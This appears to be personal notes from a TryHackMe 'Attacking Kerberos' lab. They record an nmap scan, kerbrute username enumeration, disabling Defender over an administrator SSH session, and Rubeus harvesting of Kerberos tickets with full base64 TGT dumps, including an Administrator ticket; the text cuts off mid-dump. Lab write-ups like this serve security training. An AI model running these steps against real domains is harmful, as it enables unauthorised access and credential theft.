@@ -1,2 +1,799 @@
 https://tryhackme.com/room/attackingkerberos
 
+>nmap -F -A -Pn 10.10.255.103
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-25 09:32 GMT
+Nmap scan report for ip-10-10-255-103.eu-west-1.compute.internal (10.10.255.103)
+Host is up (0.00049s latency).
+Not shown: 92 closed ports
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
+|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
+|_  256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (EdDSA)
+53/tcp   open  domain        Microsoft DNS
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-03-25 09:32:27Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
+| Not valid before: 2021-01-02T15:19:56
+|_Not valid after:  2021-07-04T15:19:56
+|_ssl-date: 2021-03-25T09:32:45+00:00; 0s from scanner time.
+MAC Address: 02:0C:76:B2:7B:5B (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=3/25%OT=22%CT=7%CU=41939%PV=Y%DS=1%DC=D%G=Y%M=020C76%T
+OS:M=605C58C5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=U
+OS:)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M2301NW8NNS%O
+OS:2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%O5=M2301NW8NNS%O6=M2301NNS)WIN(
+OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
+OS:%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=
+OS:Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%
+OS:RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: CONTROLLER-1, NetBIOS user: <unknown>, NetBIOS MAC: 02:0c:76:b2:7b:5b (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-03-25 09:32:45
+|_  start_date: 1600-12-31 23:58:45
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.49 ms ip-10-10-255-103.eu-west-1.compute.internal (10.10.255.103)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.00 seconds
+
+
+>echo 10.10.255.103 controller.local >> /etc/hosts
+
+>mkdir kerbrute
+>cd kerbrute
+>wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
+>chmod +x kernrute
+>wget https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
+
+>wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 03/25/21 - Ronnie Flathers @ropnop
+
+2021/03/25 09:45:45 >  Using KDC(s):
+2021/03/25 09:45:45 >  	CONTROLLER.local:88
+
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
+2021/03/25 09:45:45 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
+2021/03/25 09:45:45 >  Done! Tested 100 usernames (10 valid) in 0.026 seconds
+
+>ssh administrator@controller.local
+>##fully disable defender##
+>cd Downloads
+>Rubeus.exe harvest /interval:30
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
+  StartTime             :  3/25/2021 2:19:26 AM 
+  EndTime               :  3/25/2021 12:19:26 PM
+  RenewTill             :  4/1/2021 2:19:26 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, f
+orwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkOxVd2vmhfv
+95rN2v1nZhKJifY5MK2w9gnE
+    T7rsWU79zEHkc6zoNxtjGGuuEXPI5jeBpUfFywYPFe+v33VVwT/Eg6Vc1i/kZw0Tjkjb9GJPJCZV
+2JS/SRDuGCrVmAZ6kKfP+7no
+    smfFsRgNKW2VgUR+uFeSq2ZMT0q6J/LdkkH9CkruBzqwt7j0k0ewbPCmV1CKwZcAiY4u7XCjbDyE
+iweK+TQo0gMJjmKlP+Fux5vt
+    HGNvVVm7t16nyezqWo2ioGqU8madEh2vlaSYIOL7mP0dUGTYtjNem5TIQbBBlE7cOHqefOP95d5K
+KxdZkTLJc53qNUrIf08t1LpL
+    NDq1dfpwhTc7oYkvg7DUvOQfwpqRuqXlcZUiLsXAJXK7TXuWEWAUu2LTSyqQ/x/unhaeuPtb5iTR
+xnPBie1xxZdsE28Fo2zBFTtn
+    eAjxGCmJSHl92fdqEwMzRz1mqW2gc4u+7dhLoPssDlcGgeo17SLVWWGed1hO3BgjaMsG4/nKq53b
+kj/DjXSg8Vbm96lINIQZNaDn
+    YGt1+V6+MZeqZWsPZtQ6YdFonaWJRqGEd9VlW6+Zt/P3Bbd8EsJMNFwNqGgVr4srvik800mUG0wm
+MlH4v5clr7vR57Gq1TfsLvl1
+    9t088rFD+ooEzf8DBEV+gbQJATpPLdzICGnLofn12Z0OGGhp97/pGlJgkIT+MVdupu6NHE48sPWV
+jQGJcKuXB731P6ZXP79W9uKa
+    P20GIJWBGuK5srOSUfFl4B7Dzi76AyIFiQTa3yE4rhVen5bfTfaUDJoAR7frf0bUTami1mYLX18f
+fk0AuVNrxseh/3E9z8WANmRu
+    ue9fT834Z0nXcl/VnbBz4Gdq53dipU/XzReQXz9NIqMVw1/pwSKz5Cw7lNgRaRFkVRhF17k+m36s
+zYWACV5VAkyqvEqMpOES52+z
+    DIXHkdi5iaXMqgau02y/ebBposeKvUA0BByREMQPXO438V/4lt9NugWYoWI+hoWjt3rxhC8xKluj
+hTZ1FigRCVBe9XGr1eqU1984
+    +OyJjeAPXSSBdMyv8sTIGp4Bjk++RGyIYPLiXMQ4n7k8wbSrxjqbx2YwzvOsJBk5N+GP+2YlTew5
+YzCQUzYeTqYDMNT/iiSq16tS
+    4FZn7DNCNvRhMlGrikqpgd5bAOtWFlfWGYlMZjIbhhKco3xrFybawr8L7hqMA2Sq373WyamcXLdS
+E4Vr0C84IZYXtk3Xn7s+yDfe
+    MecxV7I+j5d/c+PNjfpaaPmaIT6TWkbEoTS+FUKhNOgm3tUgziFvq6jyl4YjsSAn2Prxs/T9o4oL
+LvLRNlj1MuVaP4on301u1uj2
+    4Fhpy1BJYiGEGx8C88P38V7qBDzwBrVTtOZFUu6QR772S19azrSjFZajgfcwgfSgAwIBAKKB7ASB
+6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCBn/ZFYsMwEUTCsMIXYsnSLqcM0NT/ew/D+kD0ginzlvqESGxBDT05UUk9MTEVS
+LkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDMyNTA5MTkyNlqmERgPMjAyMTAzMjUx
+OTE5MjZapxEYDzIwMjEwNDAx
+    MDkxOTI2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9M
+TEVSLkxPQ0FM
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
+  StartTime             :  3/25/2021 2:48:51 AM
+  EndTime               :  3/25/2021 12:48:51 PM
+  RenewTill             :  4/1/2021 2:48:51 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, f
+orwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEElCC64tMwNaw
+Vqh3jtKdQu/zeardXF6PEClL
+    JemsYbQgC53PNZOHLe0uGHnyE70+aJpL9S36K9JkIVfmfcDVrTqbu9g6t1khoaabfxArR4yHEBsf
+wB+sgcO20SM2aBdGvv5JAtFb
+    B1gUJE/qhyjLw+Gq6Sqxz2pkpGn6GXZzWoJ6zy/c9B6ifPzajec4sW75w1Z0ZE/B+OWLC8f1GYAT
+DuDsVd0249yec6s6S1rUPtFX
+    qcsTbcWoN3/ygIvW8uIzENM/tOcgu41+fI9yL8BTraBPI81RmABX2gvbtnpf6vxGcQb0SRvrK7Bi
+TAqVt9dPMwqUqRHp/33az7hs
+    +tKujoEzRqys5Np7a9UX0CksBxul1tXG21UWsmQQTyEbpzKPNzxBrcXF8EtdbCX0GIe0JOWg+omH
+33ef22CNbIAFSwSuUZ3HU30T
+    TnlhIpviXSLuMSm8h3XkE8z0DcddB7bXC4nhSCwJ6EbKR2/cZogXwIoE73ApLwDUpTGodCYYmdA0
+Kr+1dMapnd37XODiAyzDcYDv
+    h+jmHm2FSoiYVkNWIi9VEGRWqf0o6ufK8WUzv5bN/D/LxVYQJSOupwudUNQC4RRSK+0IMY+mFVq2
++OjvVyQG/Cht3aep9lFWw2NZ
+    KM+TMgg3Rab79h0Zru50UkprOBAqQj8zApbM37E3AdBLLw58iB8F/lSbasFsoJOBWbs4NxFeiDJF
+/lRglSiBPONj4h40+7rF+DTc
+    O8xrX3uXfV9b+rGcPbo73ELXO1GfFlg8TuyucqaEyD6vm9aJILfVtnp/Dv7QXNbmp2zykiTqqxZY
++Ynk2LnknTqUYHifpwPl5Jxs
+    Wuy7WP3TQtjVBbWwZ45whAiEtDcwPJ5JfNCE+0mgQpIjdyxWVdF7Akie6Y865cxeCEij0RUMeN91
+yiYol6uEgVDmBl+CttzmJvP/
+    1tkWlfMAcQFg5KsOrnZYOFz2WPGzWtzTcXgwS8oKIpaTiqNcUmEY5gjpcgnauMtA0MCd9hNLT7qi
+D9oraT8+bGQ7CdvnI3giPlp/
+    Eg5YD4/39d94yxA8sdFYx3iHmG5JN1hvnji0jZeW0JUq5sZs493MkWzEv7NQC1XlQQFSpmTpcNL4
+67LZTDKgKGxjlXdnLY+Ltazz
+    G44ACm9/xfA+ZDBGKKOU509ylD5MNTEwm8BsrkmY/2lst+0J87neKxZd/MzQEaXqZoGZ2yvAspiy
+nmzp4bY1o1Kw6agNCWlv7d6R
+    ayB8OlhBAdswIkZ8F6YXqFdD4HBi3JaLG5Mxo6VmB5U3UjMSB5rviBFst6cpyS5hmFBQLHsLz7yS
+GaXJ95pZphWB/OTOEybonTnM
+    0rGQR/pXAXe2ZkAE3GfSN9B7tXEmtY66ap8x6lq1rfbMNt2/BMo9Dn6jgfcwgfSgAwIBAKKB7ASB
+6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCByfXOGKO022NYYswqB57z+xY4d1OaX9+J342caLGup16ESGxBDT05UUk9MTEVS
+LkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDMyNTA5NDg1MVqmERgPMjAyMTAzMjUx
+OTQ4NTFapxEYDzIwMjEwNDAx
+    MDk0ODUxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9M
+TEVSLkxPQ0FM
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
+  StartTime             :  3/25/2021 2:19:26 AM
+  EndTime               :  3/25/2021 12:19:26 PM
+  RenewTill             :  4/1/2021 2:19:26 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded,
+ forwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEhiesTRvPGiE
+3yqd5F68IU5kfvfMLP9lC7mL
+    eu5UCHFwCHDnYo+gICdSjjWCUDyDTPAnbB/7vVIr2n3vQqrhcASiLe+zZRXu7rQAOb2/QotsNKDt
+j16Vami+py6REYcvSMU5uKm5
+    ydZmqeXONkYvMpshtd+cYNNZUTcUfP4NPqw3F4YoaecdK3DOoAHw5bk9cuwRcK5u5ToT+smg1QdA
+2406pZAWSCbtEg2q6FmPUali
+    EoLZi7uHB1Fs5yom+sIhhC71MkK6s1Vn+J1Fgvv1fRABWtDOMCzs7sQK73780asQn1FUPmzuNoFq
+QDzubnXbweYC2G6RE/NH+v9C
+    w/C8PRphOg6BZFc4ReIPn/XEDnZmuCUdzfwbykDbYrFKoH7Q/8CeKnG63Z8YOmRZtwfo/jvBQyyv
+gv5Bq1YfBnn2xHxRwxq4sFXp
+    3ZH+5Pvb1YL6JOqNWkwZHxS4seLMaKBj05TlbnwPFauhJpNCuTeDeTMZbfzI7a1XhuWHOZXj82pv
+z54Zc3ZARsgRJw1xzEWKYId+
+    NEeaDZQAS37TKnYX4zcVFtJEwTmmugH7tDbxRYr3sB6//jEUIYU9tJSJWJUr5bf1+xioRvyGA7lN
+RvCoJm7udCxj7DpFl1TJqZX1
+    9qrGC+Q7wTzyFvFC5isxxxTFnl73iP7OfAPTg5qkuQ3mHR3Wz01ddmygClwDetYJjV9aHrTBG/uU
+zmVI2Ci2pHOpDayKDOQU9ZHp
+    qeBIo7IZAduiaPW4KeHaWwC/rmsFgTPOJpiGE9VScnagyOZ6g7hZokvqVzxbib3oETs9W9r3IQOi
+tGrgwcaA/pe23467uX/fdnFK
+    JUtHLQbOa+jg3e39go582h8pcQNunyIBI/luxR7ZSo6WF99kBtwI6xfXdPttSsgqp+MXnD9ww4ZY
+7FwOXvgzpZIYsYcmM0dVgpDf
+    BTEYlklgOBblse1cbxk8yhsKNdeHRp7n7ueq74LPjomCmGmymCQhpWmmN/NzCRox2M98r1ZgsAAA
+EzNGPUFHmdPhtMQi2//4A9/P
+    +T0LXHc/nCTOzl3Hleg+TLfuH2BReyagmZPTLz+lypAXawWTyGj4LWHYwTfbz6WM73bykhQ9LL+z
+Z3xOEmoSO70rhCsf5RTfUZNV
+    D1GLTg3GPPh5l90fIgDwousaFps1E7ZtJL4z/m+i6ztsAq4ocL10A6U+A4eYvNHqXo3vvkGxBz63
+YutA6C/te1hSvv+ill6mRT6X
+    MecSl8f2yoFcxCTZeWMdjylfX0yoHKw/mCqKEB2Nzo8Cts6AzCGh9Z2ohj//HRzd7MdYxD/1W7xV
++3+62HhTUEZWzWmAHPaqKZvj
+    u9veApl2Hde7kRpuoL+8Bn33GB6p/tqUl+FKqyFfVS2dE/aLlu6w7VSjgfcwgfSgAwIBAKKB7ASB
+6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCDzN0czMNVcPgj1XpLJBQS7uKZWoR4jVlHsRnScwrI1saESGxBDT05UUk9MTEVS
+LkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIxMDMyNTA5MTkyNlqmERgPMjAyMTAzMjUx
+OTE5MjZapxEYDzIwMjEwNDAx
+    MDkxOTI2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9M
+TEVSLkxPQ0FM
+
+  User                  :  Administrator@CONTROLLER.LOCAL
+  StartTime             :  3/25/2021 2:48:23 AM
+  EndTime               :  3/25/2021 12:48:23 PM
+  RenewTill             :  4/1/2021 2:48:23 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, f
+orwardable
+  Base64EncodedTicket   :
+
+    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGjNw5D44AwHO
+6AMjBTLXOZ9TdYTaKw6ApBDC
+    NTgyi3BZF93eP4aV6Th43TzKmvl8Y0W/He0sw7osvJQwCihU90/AKaoLfAmwvuAPL8mSwsaayLHa
+Xa9P23eviXMdHrjv7KWuEskF
+    2M12FThqiVkcP9T3xUGAE9349CZuYH4OYroCkY0SBcIf+Jg3TymxXo5qWiSNQusfJZeIzbbiMgRC
+s/szTNhx09qOfVkMF41J+PST
+    S90pjI9UpVQneEda2DjzZpRTP9AY4HuWK/TEqtbxNuKRTDvHb5K2U8jTFm5w8r+FXeJCC+iJeD6G
+FOub5vIJQOT6dLMoOMPEOreI
+    Rtcn8VirX4ei6VGukJECt7umjQZblN0KwUKlGTxQlmATKe3vzn7/eXceD4zWzA1YdJ/8j/b96EEZ
+8c2gs8U3v3x99LGv6s0RDKNA
+    v2pVaFcTGbfUBgLSbHDmdyhjfHpV6v1pJdjwWaeSRmmXkFY84BnKoWgLt8+PTwY/3/5vy2+Ee63Z
+PSE8dUYKLqcfk0+JTWUJwUSf
+    SLm/bHfHXquWNvPghXTUKt5Xd7xDDndJ1fdIZ459wiWh/lpQwk6alieD3ugVQ2i4trFMUWAGpAvs
+yIkDwkFMXJKsVG36A6drxMiH
+    24Jtx2JBLOrR92JPt7D7KbDebUqevnTLT1FVJvciSqLaygK/IO+ruEsjKVYV5IlNWduYmdMmF8Nt
+lW448pgWKLYX2FzCOuFzv+7s
+    z4x9VZUAFQzorR/NTUlTDTUdzlBGvBF6QShEERskzw05e267ZVqEZQ7KHd0bjBi+3+S2IbR1K8eo
+gGkmuIW3AcByX/74a6wlFcYf
+    CmNus0Dtm8sfR85exsSfGK2uZSTr/+mZTLjFK8i5I+hoVJ42DyfcwyU9BaJzwGRb0OVAjVBvFcv5
+CQ5/x3066gIRtYTqVcKISMcl
+    VJi51SMHz5GQU9qJMpNP762cjUqTi6T3ToNnaMr9dUENdKMseW2QpnEcsG0Px0M8A1RchHh4Trvm
+h2YqDCcaS3r76U1d2jSl9G+M
+    6MxGa39CxlLGTcICNSGsxPS+UGgcXAl9SrUtIRIbXbPMLBQmVjjfZJ+HYsvDg8agBtt+NRABtKOH
+NDhc6/40VZsKFP08EJEBJqKD
+    KBWSGbbl1Cw4HAeMvtwX4IafP6MFoOx735p6jdwdT68e52atzLCIqMJDKmM59Vvo0hUCMDOHfrv5
+SbqYnYEYu38c9FQAa0DMAC70
+    QKPpCCPEVwOiyMSpypjZdcKZFS/rShy8spnodmt5yqdABXBm8qeNhNrujylsnBKgnnMLYUqicA57
+PTBLBn3JZ3nlO8EfOrBQPASp
+    rCjCLETK7fpgPU04VFJN693L8hovIgPfJzqqHRailvHfl2S6WEIJQ2n/45zwkE2ORaOB9zCB9KAD
+AgEAooHsBIHpfYHmMIHjoIHg
+    MIHdMIHaoCswKaADAgESoSIEIM4cvGypmxLAK+z1/olxC7uSqiI242hIXc1EShw78gHVoRIbEENP
+TlRST0xMRVIuTE9DQUyiGjAY
+    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwMzI1MDk0ODIzWqYRGA8y
+MDIxMDMyNTE5NDgyM1qnERgP
+    MjAyMTA0MDEwOTQ4MjNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3Qb
+EENPTlRST0xMRVIuTE9DQUw=
+
+[*] Ticket cache size: 4
+[*] Sleeping until 3/25/2021 2:50:26 AM (30 seconds) for next display
+
+
+[*] Refreshing TGT ticket cache (3/25/2021 2:50:26 AM)
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
+  StartTime             :  3/25/2021 2:19:26 AM
+  EndTime               :  3/25/2021 12:19:26 PM
+  RenewTill             :  4/1/2021 2:19:26 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, f
+orwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkOxVd2vmhfv
+95rN2v1nZhKJifY5MK2w9gnE
+    T7rsWU79zEHkc6zoNxtjGGuuEXPI5jeBpUfFywYPFe+v33VVwT/Eg6Vc1i/kZw0Tjkjb9GJPJCZV
+2JS/SRDuGCrVmAZ6kKfP+7no
+    smfFsRgNKW2VgUR+uFeSq2ZMT0q6J/LdkkH9CkruBzqwt7j0k0ewbPCmV1CKwZcAiY4u7XCjbDyE
+iweK+TQo0gMJjmKlP+Fux5vt
+    HGNvVVm7t16nyezqWo2ioGqU8madEh2vlaSYIOL7mP0dUGTYtjNem5TIQbBBlE7cOHqefOP95d5K
+KxdZkTLJc53qNUrIf08t1LpL
+    NDq1dfpwhTc7oYkvg7DUvOQfwpqRuqXlcZUiLsXAJXK7TXuWEWAUu2LTSyqQ/x/unhaeuPtb5iTR
+xnPBie1xxZdsE28Fo2zBFTtn
+    eAjxGCmJSHl92fdqEwMzRz1mqW2gc4u+7dhLoPssDlcGgeo17SLVWWGed1hO3BgjaMsG4/nKq53b
+kj/DjXSg8Vbm96lINIQZNaDn
+    YGt1+V6+MZeqZWsPZtQ6YdFonaWJRqGEd9VlW6+Zt/P3Bbd8EsJMNFwNqGgVr4srvik800mUG0wm
+MlH4v5clr7vR57Gq1TfsLvl1
+    9t088rFD+ooEzf8DBEV+gbQJATpPLdzICGnLofn12Z0OGGhp97/pGlJgkIT+MVdupu6NHE48sPWV
+jQGJcKuXB731P6ZXP79W9uKa
+    P20GIJWBGuK5srOSUfFl4B7Dzi76AyIFiQTa3yE4rhVen5bfTfaUDJoAR7frf0bUTami1mYLX18f
+fk0AuVNrxseh/3E9z8WANmRu
+    ue9fT834Z0nXcl/VnbBz4Gdq53dipU/XzReQXz9NIqMVw1/pwSKz5Cw7lNgRaRFkVRhF17k+m36s
+zYWACV5VAkyqvEqMpOES52+z
+    DIXHkdi5iaXMqgau02y/ebBposeKvUA0BByREMQPXO438V/4lt9NugWYoWI+hoWjt3rxhC8xKluj
+hTZ1FigRCVBe9XGr1eqU1984
+    +OyJjeAPXSSBdMyv8sTIGp4Bjk++RGyIYPLiXMQ4n7k8wbSrxjqbx2YwzvOsJBk5N+GP+2YlTew5
+YzCQUzYeTqYDMNT/iiSq16tS
+    4FZn7DNCNvRhMlGrikqpgd5bAOtWFlfWGYlMZjIbhhKco3xrFybawr8L7hqMA2Sq373WyamcXLdS
+E4Vr0C84IZYXtk3Xn7s+yDfe
+    MecxV7I+j5d/c+PNjfpaaPmaIT6TWkbEoTS+FUKhNOgm3tUgziFvq6jyl4YjsSAn2Prxs/T9o4oL
+LvLRNlj1MuVaP4on301u1uj2
+    4Fhpy1BJYiGEGx8C88P38V7qBDzwBrVTtOZFUu6QR772S19azrSjFZajgfcwgfSgAwIBAKKB7ASB
+6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCBn/ZFYsMwEUTCsMIXYsnSLqcM0NT/ew/D+kD0ginzlvqESGxBDT05UUk9MTEVS
+LkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDMyNTA5MTkyNlqmERgPMjAyMTAzMjUx
+OTE5MjZapxEYDzIwMjEwNDAx
+    MDkxOTI2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9M
+TEVSLkxPQ0FM
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
+  StartTime             :  3/25/2021 2:48:51 AM
+  EndTime               :  3/25/2021 12:48:51 PM
+  RenewTill             :  4/1/2021 2:48:51 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, f
+orwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEElCC64tMwNaw
+Vqh3jtKdQu/zeardXF6PEClL
+    JemsYbQgC53PNZOHLe0uGHnyE70+aJpL9S36K9JkIVfmfcDVrTqbu9g6t1khoaabfxArR4yHEBsf
+wB+sgcO20SM2aBdGvv5JAtFb
+    B1gUJE/qhyjLw+Gq6Sqxz2pkpGn6GXZzWoJ6zy/c9B6ifPzajec4sW75w1Z0ZE/B+OWLC8f1GYAT
+DuDsVd0249yec6s6S1rUPtFX
+    qcsTbcWoN3/ygIvW8uIzENM/tOcgu41+fI9yL8BTraBPI81RmABX2gvbtnpf6vxGcQb0SRvrK7Bi
+TAqVt9dPMwqUqRHp/33az7hs
+    +tKujoEzRqys5Np7a9UX0CksBxul1tXG21UWsmQQTyEbpzKPNzxBrcXF8EtdbCX0GIe0JOWg+omH
+33ef22CNbIAFSwSuUZ3HU30T
+    TnlhIpviXSLuMSm8h3XkE8z0DcddB7bXC4nhSCwJ6EbKR2/cZogXwIoE73ApLwDUpTGodCYYmdA0
+Kr+1dMapnd37XODiAyzDcYDv
+    h+jmHm2FSoiYVkNWIi9VEGRWqf0o6ufK8WUzv5bN/D/LxVYQJSOupwudUNQC4RRSK+0IMY+mFVq2
++OjvVyQG/Cht3aep9lFWw2NZ
+    KM+TMgg3Rab79h0Zru50UkprOBAqQj8zApbM37E3AdBLLw58iB8F/lSbasFsoJOBWbs4NxFeiDJF
+/lRglSiBPONj4h40+7rF+DTc
+    O8xrX3uXfV9b+rGcPbo73ELXO1GfFlg8TuyucqaEyD6vm9aJILfVtnp/Dv7QXNbmp2zykiTqqxZY
++Ynk2LnknTqUYHifpwPl5Jxs
+    Wuy7WP3TQtjVBbWwZ45whAiEtDcwPJ5JfNCE+0mgQpIjdyxWVdF7Akie6Y865cxeCEij0RUMeN91
+yiYol6uEgVDmBl+CttzmJvP/
+    1tkWlfMAcQFg5KsOrnZYOFz2WPGzWtzTcXgwS8oKIpaTiqNcUmEY5gjpcgnauMtA0MCd9hNLT7qi
+D9oraT8+bGQ7CdvnI3giPlp/
+    Eg5YD4/39d94yxA8sdFYx3iHmG5JN1hvnji0jZeW0JUq5sZs493MkWzEv7NQC1XlQQFSpmTpcNL4
+67LZTDKgKGxjlXdnLY+Ltazz
+    G44ACm9/xfA+ZDBGKKOU509ylD5MNTEwm8BsrkmY/2lst+0J87neKxZd/MzQEaXqZoGZ2yvAspiy
+nmzp4bY1o1Kw6agNCWlv7d6R
